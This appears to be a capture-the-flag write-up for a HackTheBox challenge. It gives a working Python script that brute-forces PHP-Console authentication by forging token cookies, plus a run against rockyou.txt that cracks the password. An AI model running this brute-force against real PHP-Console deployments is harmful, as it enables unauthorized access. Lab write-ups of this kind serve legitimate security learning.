PHP_ConsoleAuth:    def __init__(self, password, salt, remote_addr = None, pub_key = None):        self.password = password        self.salt = salt        self.remote_addr = remote_addr        self.pass_hash = None        self.token = None           self.pub_key = pub_key        def getToken(self):        self.token =  hashlib.sha256(self.pass_hash.encode() + self.pub_key.encode()).digest().hex()        return self.token        def setPassword(self, password):        self.password = password    def calcPassHash(self):        self.pass_hash = hashlib.sha256(self.password.encode() + self.salt.encode()).digest().hex()        return self.pass_hash\"\"\"Auth lib -&gt; https://github.com/barbushin/php-console/blob/master/src/PhpConsole/Auth.php\"\"\"if __name__ == '__main__':        SALT = 'NeverChangeIt:)'    # Pub key is unique because its the sha256sum(clientUID + passwordHash) and the clientUI is the Remote Address, in our case is a fixed one    # Extracted using chrome extension    PUB_KEY = \"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e\"     passwords_list = sys.argv[2]    hackthebox_url = sys.argv[1]    auth = PHP_ConsoleAuth(None, SALT, pub_key=PUB_KEY)        success = False    print(\"[+] Starting bruteforce on {}  PHP-Console [+]\".format(hackthebox_url))        with open(passwords_list, 'r', errors='ignore') as wordlist:        for password in wordlist.readlines():            if not password: continue            password = password.rstrip()            auth.setPassword(password)             auth.calcPassHash()                    print(\"[+] Trying {} [+]\".format(password))            token = auth.getToken()            json_req = {                \"php-console-client\": 5,                \"auth\": {                    \"publicKey\": PUB_KEY,                    \"token\": token                 }             }            pack = base64.b64encode(json.dumps(json_req).encode()).decode()            cookie = {\"php-console-server\": \"5\", \"php-console-client\": pack}            req = requests.post(hackthebox_url, cookies=cookie)            php_console_res = req.headers.get('PHP-Console', None)            if php_console_res is None:                print(\"Is this really running PHP-CONSOLE ?\")                sys.exit(1)                        php_console_res = json.loads(php_console_res)            success = php_console_res['auth']['isSuccess']            if success:                        print(\"[+] Cracked! Password -&gt; {} [+]\".format(password))                breakI downloaded the classic rockyou.txt wordlist, and run against our target:$ python3 brute.py docker.hackthebox.eu:32741 rockyou.txt...[+] Cracked! Password -&gt; poohbear [+]Now enter the password, and the flag will be in the alert!I don’t know if i can post the flag here, but the flag will be in the alert!"
  }
  
]

